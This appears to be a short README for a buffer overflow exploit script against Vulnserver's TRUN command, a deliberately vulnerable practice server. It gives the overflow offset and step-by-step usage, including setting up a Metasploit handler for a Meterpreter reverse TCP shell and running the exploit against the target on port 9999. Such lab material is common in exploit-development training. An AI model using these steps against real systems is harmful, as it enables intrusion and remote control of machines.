The Vulnserver's TRUN command is vulnerable to a classic BoF or Buffer Overflow.
After fuzzing the command the offset comes out to be at 2003. 
The total size of the payload remains constant throughout the whole process to maintain the reliability of the exploit.

USAGE
1)Get the trun.py in your working directory.

2)Make it an executable by running chmod +x trun.py

3)Fire up the msfconsole and set up the multi/handler and set the following options and hit run.
  payload==>windows/meterpreter/reverse_tcp
  LPORT==>4444
  LHOST==>eth0 (or any other interface that you are using currently)
  
4)After setting up the listener simply run the exploit by running ./trun.py
  NOTE: The vulnserver listens for incomming connections on port 9999 by default
        so you don't have to specify the port, just type in the IP Address of the vulnserver
        thats all.
